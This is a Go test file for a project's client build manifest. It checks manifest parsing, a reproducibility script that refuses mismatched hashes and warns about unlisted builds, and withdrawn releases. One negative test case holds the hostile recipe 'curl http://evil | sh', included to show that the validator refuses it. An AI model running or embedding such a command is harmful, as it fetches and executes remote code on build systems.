package clientbuilds

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/FairForge/vaultaire/internal/translog"
)

// The committed manifest is valid: every row is a client_build entry the log
// would accept, one per (client, sha256).
func TestClientBuildManifest_Valid(t *testing.T) {
	rows, err := Load()
	require.NoError(t, err)
	require.NotEmpty(t, rows, "the first release (sdk-wasm) is in the manifest")
	assert.Equal(t, translog.ClientSDKWasm, rows[0].Client, "the first row is the SDK key core's WASM")
}

func TestClientBuildManifest_RefusesFreeTextAndDuplicates(t *testing.T) {
	for name, raw := range map[string]string{
		"an unknown client": `{"clients":[{"client":"evil","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"an unknown field":  `{"clients":[{"client":"sdk-wasm","note":"hi","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"a short commit":    `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"abc123","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
		"a free recipe":     `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"curl http://evil | sh"}]}`,
		"a duplicate": `{"clients":[{"client":"sdk-wasm","version":"1.0.0","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"},
			{"client":"sdk-wasm","version":"1.0.1","source_commit":"` + h40 + `","sha256":"` + h64 + `","toolchain":"go1.26.10","recipe":"scripts/build-client.sh"}]}`,
	} {
		rows, err := parse([]byte(raw))
		assert.Error(t, err, name)
		assert.Nil(t, rows, name)
	}
}

const (
	h40 = "bc004600576eaeebc96acdd8bb85a9530febb34d"
	h64 = "07685b5f6dba6a5419a9c64ef3d524839f71a1452ef79ee21193628163dcc911"
)

// The Deploy job's gate: a manifest row whose sha256 is not what its source
// commit builds FAILS scripts/repro-check-clients.sh. The passing direction
// (the real manifest) is the Deploy job's own step on every deploy; here the
// cheap sdk-js row is doctored, so the test needs no WASM build.
func TestClientBuildManifest_ReproCheckFailsOnADifferentHash(t *testing.T) {
	if testing.Short() {
		t.Skip("runs the repro script (git archive + a build)")
	}
	root, err := filepath.Abs("../../..")
	require.NoError(t, err)
	if _, err := exec.LookPath("jq"); err != nil {
		t.Skip("jq is not installed")
	}

	doctored := map[string]any{"clients": []translog.ClientBuild{{
		Client: translog.ClientSDKJS, Version: "0.1.0", SourceCommit: h40,
		SHA256:    "4444444444444444444444444444444444444444444444444444444444444444",
		Toolchain: "none", Recipe: "scripts/build-client.sh",
	}}}
	raw, err := json.Marshal(doctored)
	require.NoError(t, err)
	mf := filepath.Join(t.TempDir(), "manifest.json")
	require.NoError(t, os.WriteFile(mf, raw, 0o600))

	cmd := exec.Command("bash", filepath.Join(root, "scripts", "repro-check-clients.sh"), mf)
	cmd.Dir = root
	out, err := cmd.CombinedOutput()

	require.Error(t, err, "a wrong hash fails the deploy: %s", out)
	assert.Contains(t, string(out), "REFUSED")
}

// RP51-3 (Stage 1a Prompt 38): between an sdk merge and its manifest row,
// main builds client bytes the log does not list, and translog-verify
// -client refuses them. No CI check can demand the row (it names the MERGE
// commit, which no sdk PR knows), so the Deploy job's script builds the
// CHECKOUT's own clients after the rows and warns — never fails — when one is
// not listed.

// reproCheck runs the script on rows, building only sdk-js from the
// checkout (no WASM build), and returns its output and error.
func reproCheck(t *testing.T, rows []translog.ClientBuild) (string, error) {
	t.Helper()
	if testing.Short() {
		t.Skip("runs the repro script (git archive + a build)")
	}
	if _, err := exec.LookPath("jq"); err != nil {
		t.Skip("jq is not installed")
	}
	root, err := filepath.Abs("../../..")
	require.NoError(t, err)
	raw, err := json.Marshal(map[string]any{"clients": rows})
	require.NoError(t, err)
	mf := filepath.Join(t.TempDir(), "manifest.json")
	require.NoError(t, os.WriteFile(mf, raw, 0o600))
	cmd := exec.Command("bash", filepath.Join(root, "scripts", "repro-check-clients.sh"), mf)
	cmd.Dir = root
	cmd.Env = append(os.Environ(), "REPRO_CHECKOUT_CLIENTS="+translog.ClientSDKJS)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func checkoutSHA256(t *testing.T, rel string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("../../..", rel))
	require.NoError(t, err)
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// A manifest whose rows all rebuild, none of which is the checkout's sdk-js:
// the deploy passes and the log says which client and hash are unlisted.
func TestClientBuildManifest_ReproCheckWarnsOnAnUnlistedCheckoutBuild(t *testing.T) {
	old := translog.ClientBuild{Client: translog.ClientSDKJS, Version: "0.1.0", SourceCommit: h40,
		SHA256:    "4766be3dba6d856dea354cbb2c8c90a024eb585c51234d0f3271e906e9f9d7d0", // the real 0.1.0 row
		Toolchain: "none", Recipe: "scripts/build-client.sh"}
	head := checkoutSHA256(t, "sdk/js/e2ee/index.mjs")
	require.NotEqual(t, old.SHA256, head, "precondition: the checkout's sdk-js is not 0.1.0's")

	out, err := reproCheck(t, []translog.ClientBuild{old})

	require.NoError(t, err, "an unlisted checkout build never fails the deploy: %s", out)
	assert.Contains(t, out, old.SHA256+" OK", "the row itself rebuilt")
	assert.Contains(t, out, "::warning::")
	assert.Contains(t, out, "sdk-js "+head, "the warning names the client and the hash")
}

// RP54-7 (the WP-P38 review): a checkout build that exits 0 and writes
// nothing is a warning too — `got=$(shasum …)` under set -e used to end the
// script, failing the deploy the step promises never to fail.
func TestClientBuildManifest_ReproCheckWarnsWhenTheCheckoutBuildWritesNothing(t *testing.T) {
	old := translog.ClientBuild{Client: translog.ClientSDKJS, Version: "0.1.0", SourceCommit: h40,
		SHA256:    "4766be3dba6d856dea354cbb2c8c90a024eb585c51234d0f3271e906e9f9d7d0", // the real 0.1.0 row
		Toolchain: "none", Recipe: "scripts/build-client.sh"}
	silent := filepath.Join(t.TempDir(), "build-nothing.sh")
	require.NoError(t, os.WriteFile(silent, []byte("#!/usr/bin/env bash\nexit 0\n"), 0o700))
	t.Setenv("REPRO_CHECKOUT_BUILD", silent)

	out, err := reproCheck(t, []translog.ClientBuild{old})

	require.NoError(t, err, "a checkout build with no output never fails the deploy: %s", out)
	assert.Contains(t, out, old.SHA256+" OK", "the row itself rebuilt")
	assert.Contains(t, out, "::warning::repro-check-clients: this checkout's sdk-js built nothing")
}

// The checkout's build listed (a row at HEAD with its hash): no warning.
func TestClientBuildManifest_ReproCheckListedCheckoutBuildIsQuiet(t *testing.T) {
	root, err := filepath.Abs("../../..")
	require.NoError(t, err)
	headCommit, err := exec.Command("git", "-C", root, "rev-parse", "HEAD").Output()
	require.NoError(t, err)
	committed, err := exec.Command("git", "-C", root, "show", "HEAD:sdk/js/e2ee/index.mjs").Output()
	require.NoError(t, err)
	sum := sha256.Sum256(committed)
	if hex.EncodeToString(sum[:]) != checkoutSHA256(t, "sdk/js/e2ee/index.mjs") {
		t.Skip("sdk/js/e2ee/index.mjs has uncommitted changes")
	}
	row := translog.ClientBuild{Client: translog.ClientSDKJS, Version: "9.9.9", SourceCommit: strings.TrimSpace(string(headCommit)),
		SHA256: hex.EncodeToString(sum[:]), Toolchain: "none", Recipe: "scripts/build-client.sh"}

	out, err := reproCheck(t, []translog.ClientBuild{row})

	require.NoError(t, err, out)
	assert.NotContains(t, out, "::warning::", out)
	assert.Contains(t, out, "listed")
}

// The script checks every client of the closed list by default.
func TestReproCheckClients_DefaultsToTheClosedClientList(t *testing.T) {
	raw, err := os.ReadFile("../../../scripts/repro-check-clients.sh")
	require.NoError(t, err)
	m := regexp.MustCompile(`(?m)^checkout_clients=\$\{REPRO_CHECKOUT_CLIENTS:-([^}]*)\}$`).FindSubmatch(raw)
	require.NotNil(t, m, "the script names its default list")
	assert.Equal(t, translog.BuildClients(), strings.Fields(string(m[1])))
}

// RP78-10: a release can be withdrawn without touching its row or its log
// entry (an appended client_build entry cannot be removed, and a changed
// row would be a new entry): the manifest's `withdrawn` list names (client,
// sha256) with a reason. Withdrawn refuses it; Load still returns the row
// unchanged, so the boot appends nothing new; a withdrawal of a build the
// manifest does not list is refused.
func TestClientBuildManifest_WithdrawnIsRefused(t *testing.T) {
	rows, err := Load()
	require.NoError(t, err)
	var codec051 translog.ClientBuild
	for _, b := range rows {
		if b.Client == "edge-codec" && b.Version == "0.5.1" {
			codec051 = b
		}
	}
	require.NotEmpty(t, codec051.SHA256, "0.5.1's edge-codec row stays listed")
	w, ok := Withdrawn("edge-codec", codec051.SHA256)
	require.True(t, ok, "0.5.1's edge-codec (the 411 regression) is withdrawn")
	assert.Contains(t, w.Reason, "411")
	_, ok = Withdrawn("edge-codec", strings.Repeat("0", 64))
	assert.False(t, ok)
	for _, b := range rows {
		if b.Client == "edge-ingest" && b.Version == "0.5.2" {
			_, ok := Withdrawn("edge-ingest", b.SHA256)
			assert.False(t, ok, "0.5.2's edge-ingest — the same bytes as 0.5.1's — is live: never withdrawn")
		}
	}

	raw := []byte(`{"clients":[{"client":"sdk-js","version":"0.1.0","source_commit":"` + strings.Repeat("ab", 20) + `","sha256":"` + strings.Repeat("cd", 32) + `","toolchain":"none","recipe":"scripts/build-client.sh"}],
		"withdrawn":[{"client":"sdk-js","sha256":"` + strings.Repeat("ef", 32) + `","reason":"x","withdrawn_at":"2026-10-29"}]}`)
	_, _, err = parseAll(raw)
	require.Error(t, err, "a withdrawal must name a listed build")
	assert.Contains(t, err.Error(), "not listed")
}
